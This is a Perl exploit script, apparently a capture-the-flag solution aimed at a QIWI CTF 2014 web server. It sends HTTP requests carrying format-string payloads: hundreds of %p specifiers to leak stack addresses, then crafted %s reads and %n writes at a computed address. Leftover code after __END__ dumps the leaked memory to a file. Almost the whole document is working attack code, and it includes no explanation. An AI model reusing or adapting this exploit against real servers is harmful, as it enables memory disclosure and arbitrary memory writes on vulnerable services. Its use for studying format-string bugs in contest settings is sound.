#!/usr/bin/perl

use strict;
use IO::Socket::SSL;

$| = 1;
our $server_alive = 1;
my $sock;
my $write;
my $read;
my $payload_kill;
my $payload;
my $payload_read;
our $payload_memleak;
my $buf;
our @addrs;
my $offset;

$payload_memleak =
'GET ' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 

" HTTP/1.0\nConnection: Keep-Alive\n\n";

sub do_sock() {
	my $sock;
	our $server_alive;

	while (!defined($sock = IO::Socket::SSL->new("qiwictf2014.ru:8446"))) {
		print "[!] Can not create socket, may be banned! I'm going to sleep about 10 seconds\n";
		sleep 10;
	}

	print "[+] Create new socket!\n";
	$server_alive = 1;

	return $sock;
}

sub do_write() {
	my $sock = $_[0];
	my $mess = $_[1];

	my $ret;
	$ret = syswrite($sock, $mess);

	print "[+] Write payload to socket $ret bytes!\n";

	return $ret;
}

sub do_read() {
	my $sock = $_[0];
	my $read;
	my $buf;
	my $string;

	while ($read = sysread($sock, my $data, 1024) )
	{
		$buf .= $data;
		last if $buf =~ m/ not found :\(/mg;
	}

	if ($read == 0 && $buf eq "") {
		print "[!] Can not read from socket, may be socket is died!\n";
		$server_alive = 0;
		return undef;
	}

	if ($buf =~ m/^HTTP\/1\.1\s501\sNot\sImplemented/gim) {
		print "[!] While read socket return status 501\n";
		return -1;
	} elsif ($buf =~ m/^HTTP\/1\.1\s400\sBad\sRequest/gim) {
		print "[!] While read socket return status 400\n";
		return -1;
	}

	$buf =~ m/Page:\s(.+)\snot\sfound\s:\($/sm;

	if (!defined($1)) {
		print "[!] While read socket i can not find \"Page: ... not found :(\"\n";
		print $buf,"\n";
		return -1;
	}

	$string = $1;
	print "[+] Read " . length($string) . " bytes from payload in socket!\n";
	return $string;
}

sub do_memleak() {
	my $sock = $_[0];
	our $payload_memleak;
	our @addrs;

	print "[+] Doing memleak\n";

	$write = &do_write($sock, $payload_memleak);
	$buf = &do_read($sock);

	@addrs = split /0x/, $buf;

	for (0..$#addrs) {
		$addrs[$_] =~ s/\(nil\)//g;
	}
}

sub do_payload_memwrite() {
	my $addr = $_[0];
	my $payload;

	my $addr1 = $addr;
	my $addr2 = $addr+2;

	$payload = "GET /AAA" . pack("I*", $addr1) . "JUNK" . pack("I*", $addr2) . '%x%x%x///%n%x%n' . " HTTP/1.0\nConnection: Keep-Alive\n\n";

	return $payload;
}

sub do_payload_memread() {
	my $addr = $_[0];
	my $hexval;
	my $payload;

	$hexval = sprintf("%x", $addr);
	if ($hexval eq "" || length($hexval) <= 6) {
		print "[-] Wrong param for do_memread(): $addr\n";
		return -1;
	}

	$payload = "GET /AAA" . pack("I*", $addr) . '%x%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
#	print "[+] Generate read payload:" . . "\n";

	return $payload;
}

sub do_first_query() {
	my $sock = $_[0];
	my $read;
	my $write;

	$write = &do_write($sock, "GET /123 HTTP/1.0\n\n");
	$read = &do_read($sock);

	return 1;
}

sub do_restart() {
	my $sock = $_[0];

	my $write;
	my $read;
	my $payload;

	$payload = "GET /%s HTTP/1.0\n\n";

	$write = &do_write($sock, $payload);
	$read = &do_read($sock);

	return 1;
}

sub do_check_incorrect() {
	my $addr = $_[0];

	if (	(($addr & 0x0000ff00) == 0x2000)   ||
		(($addr & 0x0000ff00) == 0x0a00)   || 
		(($addr & 0x0000ff00) == 0x0000)   || 
		(($addr & 0x00ff0000) == 0x200000) ||
		(($addr & 0x00ff0000) == 0x0a0000) ||
		(($addr & 0x00ff0000) == 0x000000) )
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

sub do_memread() {
	my $sock = $_[0];
	my $addr = $_[1];

	my $payload;
	my $read;
	my $write;
	our $server_alive;

	my $hexval = sprintf("%x", $addr);

	$payload = &do_payload_memread($addr);
	if ($payload == -1) {
		return -2;
	}

	$write = &do_write($sock,$payload);
	$read = &do_read($sock);

	return $read;
}

sub do_memwrite() {
	my $sock = $_[0];
	my $addr = $_[1];

	my $payload;
	my $read;
	my $write;
	our $server_alive;

	my $hexval = sprintf("%x", $addr);

	$payload = &do_payload_memwrite($addr);
	if ($payload == -1) {
		return -2;
	}

	$write = &do_write($sock, $payload);
	$read = &do_read($sock);

	return $read;
}

# create sock and do meamleak
$sock = &do_sock();
&do_first_query($sock);

$sock = &do_sock();
&do_memleak($sock);

for (0..$#addrs) {
#	print "$_ => $addrs[$_]","\n";
}

#exit 1;
#my $sub = 1228800;
#my $sub = 0x001ac000;
my $offset = $ARGV[0] || die "Give me offset!\n";

my $write_addr = (hex($addrs[742]) & 0xfffff000) - 0x2c000 + hex($offset) ;

if (($write_addr & 0x000000ff) == 0x0a || ($write_addr & 0x000000ff) == 0x00 || ($write_addr & 0x000000ff) == 0x20) {
	die "Bad address for writing!\n";
}

if ( &do_check_incorrect($write_addr)) {
	die "Bad address for writing!\n";
}

print sprintf("Trying to write on %08x, %08x\n", $write_addr, $write_addr+2);

$buf = &do_memwrite($sock, $write_addr);
if ($server_alive == 0 && !defined($buf)) {
	die "Server died while i can try write!\n";
} elsif ($buf == -1) {
	die "Server return error like 400 or 500!\n";
} elsif ($buf == -2) {
	die "[-] Not correct address\n";
}


print "[+] Done, check result!\n";

print "$buf\n";

__END__
$buf =~ m/^\/AAA(.{4})/sm;
if (defined($1) || $1 ne "") {
	my $retaddr = hex(unpack("H*", reverse($1)));
	if ($retaddr != $val) {
		print "[!] Format string in reading address: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . ", restarting\n\n";
		&do_restart($sock);
		sleep 1;

		$sock = &do_sock();
		&do_first_query($sock);

		$sock = &do_sock();
		&do_memleak($sock);

		next;
	}
}
else
{
	print "[!] Not found packed address: " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . "\n";
}

"a" =~ /a/;

$buf =~ m/\/\/\/(.+)/sm;

my $string = $1;
if (!defined($1) || $1 eq "" )
{
	print "[+] Got data:    " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . ": 00\n\n";

	syswrite BINARY, "\x00";
}
else
{
	my $hexstr = unpack("H*", $string);

	syswrite BINARY, $string."\x00";

	print "[+] Got data:    " . sprintf("0x%08X 0x%08X 0x%08X", $base, $offset, $val) . ": ${hexstr}00" . "\n\n";

	$offset += length($hexstr)/2;
}
